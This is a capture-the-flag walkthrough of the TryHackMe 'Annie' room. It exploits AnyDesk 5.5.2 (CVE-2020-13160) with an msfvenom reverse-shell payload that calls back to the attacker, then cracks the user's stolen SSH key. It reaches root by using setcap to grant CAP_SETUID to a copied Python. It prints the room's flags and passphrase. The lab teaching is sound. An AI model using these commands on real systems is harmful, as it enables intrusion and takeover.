# Annie 

**Platform:** TryHackMe  
**Room:** Annie  
**Difficulty:** Medium  
**Category:** Linux / Boot-to-Root  
**Primary Vulnerability:** AnyDesk 5.5.2 RCE — CVE-2020-13160  
**Privilege Escalation:** Linux capabilities / `setcap`

**Room Link:** [https://tryhackme.com/room/annie](https://tryhackme.com/room/annie)

---

## 🧭 Introduction

Annie is a Medium-difficulty Linux boot-to-root room built around an interesting attack chain.

The initial foothold comes from a vulnerable **AnyDesk 5.5.2** installation. After gaining a reverse shell, the user flag can be retrieved from Annie's home directory. The machine then introduces a Linux privilege-escalation technique involving the **`setcap` utility** and the `CAP_SETUID` capability.

The complete attack chain is:

```text
Reconnaissance
      ↓
AnyDesk discovered on port 7070
      ↓
AnyDesk 5.5.2 identified
      ↓
CVE-2020-13160
      ↓
Reverse shell
      ↓
user.txt
      ↓
Enumerate SUID / capabilities
      ↓
/sbin/setcap
      ↓
Grant CAP_SETUID to Python
      ↓
UID 0 / root shell
      ↓
root.txt
```

The official TryHackMe room describes the objective simply as reconnaissance, vulnerability research, exploitation, and privilege escalation.

---

# 🔍 1. Reconnaissance

I started with a full Nmap scan to identify all exposed services.

```bash
nmap -p- -sC -sV <TARGET_IP>
```

A typical scan reveals:

```text
PORT      STATE SERVICE
22/tcp    open  ssh
7070/tcp  open  realserver
30xxx/tcp open  tcpwrapped
```

The exact high-numbered port can vary between scans, while **7070** remains the important service for initial access. Multiple write-ups report this same pattern.

### 📊 Port 22 — SSH

SSH is running on the machine, but at this point there is no useful username/password combination and no obvious SSH vulnerability.

Therefore:

```text
22/tcp → Interesting later, but not the initial attack surface.
```

### 📊 Port 7070 — The Interesting One

Port 7070 immediately stands out.

To inspect the TLS service:

```bash
openssl s_client -connect <TARGET_IP>:7070
```

The certificate identifies the service as:

```text
CN=AnyDesk Client
```

That is the major clue.

AnyDesk is remote-desktop software, and this particular room uses a vulnerable **AnyDesk 5.5.2** installation. Searching the local exploit database reveals the relevant exploit:

```bash
searchsploit AnyDesk
```

Relevant result:

```text
AnyDesk 5.5.2 - Remote Code Execution
linux/remote/49613.py
```

The vulnerability is **CVE-2020-13160**. Independent Annie write-ups confirm the vulnerable AnyDesk version and exploit mapping.

---

# 💥 2. Exploiting AnyDesk — CVE-2020-13160

The vulnerable AnyDesk service provides the initial foothold.

The public exploit can be obtained through Exploit-DB/searchsploit:

```bash
searchsploit -m 49613
```

The exploit requires a reverse-shell payload.

A typical payload can be generated with:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=<YOUR_VPN_IP> \
LPORT=4444 \
-b "\x00\x25\x26" \
-f python \
-v shellcode
```

The generated shellcode is then placed into the exploit.

The important distinction here is that **7070 is the TCP service used to identify AnyDesk**, while the vulnerable AnyDesk discovery mechanism involves **UDP port 50001**. The exploit itself targets that AnyDesk discovery functionality.

Start a listener on the port selected for the payload:

```bash
nc -lvnp 4444
```

Then execute the modified exploit against the TryHackMe target.

The exploit can be unreliable in this room. Multiple independent write-ups report needing to reset the machine, retry the exploit, or change the reverse-shell listening port before receiving the callback.

Eventually, the listener receives a connection:

```text
connect to ... from ... 
```

Checking the current user:

```bash
whoami
```

returns:

```text
annie
```

🎯 **Initial foothold obtained.**

---

# 🐚 3. Stabilizing the Shell

A raw reverse shell is inconvenient, so I upgraded it to a more usable interactive shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then:

```bash
export TERM=xterm
```

For a more complete terminal, the usual terminal-handling sequence can also be used:

```text
Ctrl+Z
stty raw -echo
fg
```

Now the shell is much easier to work with.

---

# 🏁 4. Finding the User Flag

The user's home directory is:

```text
/home/annie
```

Listing its contents reveals:

```text
user.txt
```

Reading it:

```bash
cat /home/annie/user.txt
```

### 🏁 User Flag

```text
THM{N0t_Ju5t_ANY_D3sk}
```

This flag is independently confirmed by several Annie write-ups.

---

# 🔐 5. Inspecting Annie's SSH Key

While enumerating Annie's home directory, another interesting file appears:

```text
/home/annie/.ssh/id_rsa
```

This is Annie's private SSH key.

However, attempting to use it directly reveals that the key is protected by a passphrase.

Rather than leaving the unstable reverse shell as the only access method, the key can be investigated offline.

First, copy the key to the attacking machine and set the correct permissions:

```bash
chmod 600 id_rsa
```

Then convert the private key into a format John the Ripper can process:

```bash
ssh2john id_rsa > id_rsa.hash
```

Use the RockYou wordlist:

```bash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Several independent write-ups report that the passphrase is:

```text
annie123
```

The key can then be used for a stable SSH session:

```bash
ssh -i id_rsa annie@<TARGET_IP>
```

---

# 🧩 6. Privilege Escalation Enumeration

Now that we have a stable session as Annie, it is time to enumerate privilege-escalation opportunities.

I first check the usual sudo configuration:

```bash
sudo -l
```

There is no useful passwordless sudo entry.

Next, I check for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, one unusual entry immediately stands out:

```text
/sbin/setcap
```

This is important.

`setcap` is used to assign Linux capabilities to executables. Capabilities divide traditionally root-only privileges into smaller permission sets.

One particularly powerful capability is:

```text
CAP_SETUID
```

This allows a process to change its effective user ID.

If an attacker can assign `CAP_SETUID` to an executable such as Python, that executable can potentially change its UID to **0**, which is the root UID.

This is the key privilege-escalation path in Annie.

---

# 🐍 7. Abusing `setcap` with Python

First, locate Python:

```bash
which python3
```

Typical result:

```text
/usr/bin/python3
```

Because Annie can write to her home directory, a copy of Python can be placed there:

```bash
cp /usr/bin/python3 /home/annie/python3
```

Now use the vulnerable `setcap` binary:

```bash
/sbin/setcap cap_setuid+ep /home/annie/python3
```

The important part is:

```text
cap_setuid+ep
```

This gives the copied Python interpreter the ability to manipulate process UIDs.

Verify the capability:

```bash
getcap /home/annie/python3
```

Expected result:

```text
/home/annie/python3 = cap_setuid+ep
```

---

# 👑 8. Root Shell

Now Python has the capability required to change its UID.

Execute:

```bash
/home/annie/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Check the current user:

```bash
whoami
```

Result:

```text
root
```

The privilege escalation is complete.

The important concept is not simply "Python = root." The actual chain is:

```text
Annie
  ↓
/sbin/setcap is usable
  ↓
Copy Python
  ↓
Grant CAP_SETUID
  ↓
Python changes UID to 0
  ↓
/bin/bash
  ↓
root
```

This is a classic example of why Linux capabilities deserve the same attention as traditional SUID binaries during privilege-escalation enumeration.

---

# 🏆 9. Root Flag

With root access:

```bash
cd /root
cat root.txt
```

### 🏁 Root Flag

```text
THM{0nly_th3m_5.5.2_D3sk}
```

The root flag is independently confirmed by multiple Annie write-ups, including a walkthrough updated in 2026.

---

# 🚩 Flags

|Flag|Value|
|---|---|
|**user.txt**|`THM{N0t_Ju5t_ANY_D3sk}`|
|**root.txt**|`THM{0nly_th3m_5.5.2_D3sk}`|

---

# 🧠 Lessons Learned

### 1. Don't ignore unusual services

Port 7070 initially looks unfamiliar:

```text
7070/tcp open realserver
```

The TLS certificate provides the crucial clue:

```text
CN=AnyDesk Client
```

Service enumeration is more than reading the service-name column. Certificates, banners, scripts, and version information can reveal what is actually running.

### 2. Research unusual software

Once AnyDesk was identified, `searchsploit` immediately exposed a potentially relevant historical vulnerability:

```text
AnyDesk 5.5.2 - Remote Code Execution
```

The room then becomes a vulnerability-research exercise rather than simply guessing credentials.

### 3. Reverse shells can be unreliable

The AnyDesk exploit is somewhat finicky in this environment. Resetting the lab and retrying can be necessary. This is a useful reminder that an exploit working in theory does not guarantee reliable execution in every environment.

### 4. Check capabilities as well as SUID

A common beginner privilege-escalation workflow is:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

But Annie demonstrates why capabilities matter too.

A system can have a dangerous capability assignment even when the interesting executable itself isn't traditionally SUID.

### 5. `CAP_SETUID` is extremely powerful

The critical privilege here is:

```text
CAP_SETUID
```

Giving it to an interpreter capable of executing arbitrary code can effectively destroy the intended privilege boundary.

### 6. Patch vulnerable remote-access software

The initial compromise depends on an old vulnerable AnyDesk version. Keeping exposed remote-access software patched is therefore a fundamental defensive control.

---

# 🧠 Final Attack Chain

```text
Nmap
 │
 ├── 22/tcp → SSH
 │
 └── 7070/tcp → AnyDesk
                    │
                    ▼
             AnyDesk 5.5.2
                    │
                    ▼
             CVE-2020-13160
                    │
                    ▼
             Reverse Shell
                    │
                    ▼
                  Annie
                    │
                    ├── user.txt
                    │
                    ▼
             Enumerate SUID
                    │
                    ▼
              /sbin/setcap
                    │
                    ▼
          Copy Python + CAP_SETUID
                    │
                    ▼
             UID → 0 (root)
                    │
                    ▼
               root.txt
```

## 🏁 Final Result

**Initial Access:** AnyDesk 5.5.2 RCE  
**CVE:** CVE-2020-13160  
**User:** `annie`  
**Privilege Escalation:** `setcap` → `CAP_SETUID` → Python  
**Root:** Achieved

**User Flag:**

```text
THM{N0t_Ju5t_ANY_D3sk}
```

**Root Flag:**

```text
THM{0nly_th3m_5.5.2_D3sk}
```

Annie is essentially a compact lesson in the importance of **service enumeration → vulnerability research → foothold → privilege enumeration → Linux capabilities**.